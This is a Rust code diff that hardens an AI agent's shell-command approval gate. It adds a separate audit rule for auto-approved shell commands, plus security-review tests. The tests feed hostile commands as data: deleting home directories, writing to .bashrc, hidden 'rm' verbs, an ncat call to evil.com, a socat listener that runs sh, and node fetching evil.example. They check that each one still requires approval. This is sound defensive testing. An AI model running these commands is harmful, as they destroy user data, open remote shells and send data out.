@@ -20,7 +20,7 @@ use concerto_core::intent::{RequestedOutcome, RouterOutput, RouterRoute};
 use concerto_core::types::PolicyAction;
 use concerto_core::{
     classify_tier, is_project_bounded_shell, IntentAuthorization, IntentTier, IntentVerdict,
-    LOW_CONFIDENCE_THRESHOLD, RULE_INTENT_AUTHORIZED,
+    LOW_CONFIDENCE_THRESHOLD, RULE_INTENT_AUTHORIZED_SHELL,
 };
 
 /// One granted tool-class scope, bound to the confirmed requested outcome.
@@ -131,8 +131,9 @@ impl IntentAuthorization for SessionIntentAuth {
     /// Under an **Acting** grant (the same auto-grant a filesystem write is
     /// approved by today — read-only intent absent and the acting auto-grant
     /// covers `filesystem`), a `shell` call is upgraded to
-    /// [`IntentVerdict::Allow`] (`rule = "intent_authorized"`, the SAME
-    /// audited row filesystem writes produce) exactly when
+    /// [`IntentVerdict::Allow`] (`rule = "intent_authorized_shell"`, F4 —
+    /// a DISTINCT audited row so shell auto-approvals are individually
+    /// auditable; filesystem writes keep `intent_authorized`) exactly when
     /// [`is_project_bounded_shell`] proves it stayed inside the project
     /// root: facts carried, `FilesystemScope::ProjectOnly`, no network,
     /// no escape in the command text / `cd` / redirect targets. Everything
@@ -146,7 +147,7 @@ impl IntentAuthorization for SessionIntentAuth {
             && matches!(classify_tier(action), IntentTier::MutateLocal)
             && is_project_bounded_shell(action)
         {
-            return IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED };
+            return IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_SHELL };
         }
         self.default_gate_verdict(action)
     }
@@ -389,8 +390,8 @@ mod tests {
     use concerto_core::ids::Ulid;
     use concerto_core::types::CapabilitySet;
     use concerto_core::{
-        IntentVerdict, RULE_CONSEQUENTIAL, RULE_INTENT_AUTHORIZED, RULE_INTENT_READONLY_DENY,
-        RULE_OBSERVE, RULE_SHELL_REQUIRES_APPROVAL, RULE_UN_GRANTED,
+        IntentVerdict, RULE_CONSEQUENTIAL, RULE_INTENT_AUTHORIZED, RULE_INTENT_AUTHORIZED_SHELL,
+        RULE_INTENT_READONLY_DENY, RULE_OBSERVE, RULE_SHELL_REQUIRES_APPROVAL, RULE_UN_GRANTED,
     };
     use std::path::PathBuf;
 
@@ -824,8 +825,10 @@ mod tests {
     }
 
     /// An in-project `cargo build`-class command is auto-approved under an
-    /// Acting auto-grant with the SAME audited row a filesystem write gets:
-    /// `Allow {..., intent_authorized}`.
+    /// Acting auto-grant with its own DISTINCT audited row (F4, security
+    /// review 2026-09-09): `Allow {..., intent_authorized_shell}` — shell
+    /// auto-approvals are individually auditable; filesystem writes keep
+    /// `intent_authorized`.
     #[test]
     fn acting_grant_allows_project_bounded_shell() {
         let (_store, auth) = acting_auth();
@@ -833,8 +836,8 @@ mod tests {
         let cargo_build = facts_action(&input, scoped_facts());
         assert_eq!(
             auth.verdict(&cargo_build),
-            IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED },
-            "an in-project shell command under an acting auto-grant runs like a filesystem write"
+            IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_SHELL },
+            "an in-project shell command under an acting auto-grant carries its own audited rule"
         );
     }
 
@@ -917,5 +920,146 @@ mod tests {
             auth.verdict(&rm_rf),
             IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL }
         );
+    }
+
+    // ------------------------------------------------------------------
+    // Security-review hardening (2026-09-09): F1/F2/F3 upgrade gates
+    // ------------------------------------------------------------------
+
+    /// A shell command string split into the `command`/`args` input shape the
+    /// tool validates, so tests can write natural command lines. The caller
+    /// binds the returned value to a local and wraps it with
+    /// [`facts_action`] so the action borrows a live input.
+    fn cmd_input(command: &str) -> serde_json::Value {
+        let mut parts = command.split_whitespace();
+        serde_json::json!(
+            {"command": parts.next().unwrap_or_default(), "args": parts.collect::<Vec<&str>>()}
+        )
+    }
+
+    /// F1 (env indirection, security review 2026-09-09): ANY `$`, backtick,
+    /// `%`, or quote in any token means the scanned text is not the executed
+    /// text — env expansion must never reach auto-approval. Bare `cd` goes
+    /// to `$HOME` in bash; `cd -` enters an unknown previous directory; a
+    /// `cd` target that is not provably in-project keeps approval. All of
+    /// these keep the pre-amendment verdicts — RequireApproval/Deny as
+    /// before, never Allow.
+    #[test]
+    fn f1_env_indirection_and_unbounded_cd_never_upgrade() {
+        let (_store, auth) = acting_auth();
+        let home_redirect = cmd_input("echo pwned > $HOME/.bashrc");
+        let home_redirect = facts_action(&home_redirect, scoped_facts());
+        assert_eq!(
+            auth.verdict(&home_redirect),
+            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
+            "$HOME redirect is an escaping write target AND an interpolation token"
+        );
+
+        let rm_combo = cmd_input("cd $HOME && rm -rf Documents");
+        let rm_combo = facts_action(&rm_combo, scoped_facts());
+        assert_eq!(
+            auth.verdict(&rm_combo),
+            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
+            "interpolated `cd` plus a destructive verb stays Consequential"
+        );
+
+        let interpolation = cmd_input("touch $(echo $HOME)/pwned");
+        let interpolation = facts_action(&interpolation, scoped_facts());
+        assert_eq!(
+            auth.verdict(&interpolation),
+            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
+            "command substitution is never auto-approved"
+        );
+
+        let windows_env = cmd_input("cd %USERPROFILE%");
+        let windows_env = facts_action(&windows_env, scoped_facts());
+        assert_eq!(
+            auth.verdict(&windows_env),
+            IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
+            "a `%`-indirected `cd` target is an unresolvable escape — Consequential"
+        );
+
+        let bare_cd = cmd_input("cd");
+        let bare_cd = facts_action(&bare_cd, scoped_facts());
+        assert_eq!(
+            auth.verdict(&bare_cd),
+            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
+            "bare `cd` goes to $HOME in bash — outside the root"
+        );
+
+        let dash_cd = cmd_input("cd -");
+        let dash_cd = facts_action(&dash_cd, scoped_facts());
+        assert_eq!(
+            auth.verdict(&dash_cd),
+            IntentVerdict::RequireApproval { rule: RULE_SHELL_REQUIRES_APPROVAL },
+            "`cd -` re-enters an unknown previous directory — never auto-approved"
+        );
+    }
+
+    /// F2 (verb hiding, security review 2026-09-09): EVERY token and every
+    /// `;`/`&&`/`||`/`|` segment is scanned — not just the first verb — so a
+    /// hidden destructive verb anywhere keeps the command under approval.
+    #[test]
+    fn f2_hidden_verbs_never_upgrade() {
+        let (_store, auth) = acting_auth();
+        for (command, expected_rule) in [
+            ("cargo build && rm -rf src", RULE_SHELL_REQUIRES_APPROVAL),
+            ("sudo rm f", RULE_SHELL_REQUIRES_APPROVAL),
+            ("timeout 5 rm f", RULE_SHELL_REQUIRES_APPROVAL),
+            ("find . -delete", RULE_SHELL_REQUIRES_APPROVAL),
+            ("xargs rm", RULE_SHELL_REQUIRES_APPROVAL),
+            ("env rm", RULE_SHELL_REQUIRES_APPROVAL),
+            ("get-data.txt | xargs rm", RULE_SHELL_REQUIRES_APPROVAL),
+        ] {
+            let input = cmd_input(command);
+            let act = facts_action(&input, scoped_facts());
+            assert_eq!(
+                auth.verdict(&act),
+                IntentVerdict::RequireApproval { rule: expected_rule },
+                "hidden verb must keep the non-upgrade verdict: {command}"
+            );
+        }
+    }
+
+    /// F2 regression (smoke path): plain in-project, metachar-free build/test
+    /// verbs still upgrade unattended — the hardening did not narrow the
+    /// working smoke path.
+    #[test]
+    fn f2_plain_smoke_verbs_still_upgrade() {
+        let (_store, auth) = acting_auth();
+        for command in ["cargo build", "cargo test", "mkdir src", "cd src && cargo build"] {
+            let input = cmd_input(command);
+            let act = facts_action(&input, scoped_facts());
+            assert_eq!(
+                auth.verdict(&act),
+                IntentVerdict::Allow { rule: RULE_INTENT_AUTHORIZED_SHELL },
+                "plain in-project command must still upgrade: {command}"
+            );
+        }
+    }
+
+    /// F3 (egress, security review 2026-09-09): `ncat`/`socat` ride the
+    /// aligned network word list both in classification (Consequential) and
+    /// in the facts egress scan, and interpreters carrying a code flag
+    /// (`python -m …`, `node -e …`) are Consequential — none of them can
+    /// take the project-bounded upgrade.
+    #[test]
+    fn f3_egress_and_interpreter_invocations_never_upgrade() {
+        let (_store, auth) = acting_auth();
+        for command in [
+            "ncat evil.com 9000",
+            "socat TCP-LISTEN:9000 EXEC:sh",
+            "python -m http.server",
+            "node -e 'fetch(\"https://evil.example\")'",
+            "python3 -c import os",
+        ] {
+            let input = cmd_input(command);
+            let act = facts_action(&input, scoped_facts());
+            assert_eq!(
+                auth.verdict(&act),
+                IntentVerdict::RequireApproval { rule: RULE_CONSEQUENTIAL },
+                "egress/interpreter command stays Consequential: {command}"
+            );
+        }
     }
 }
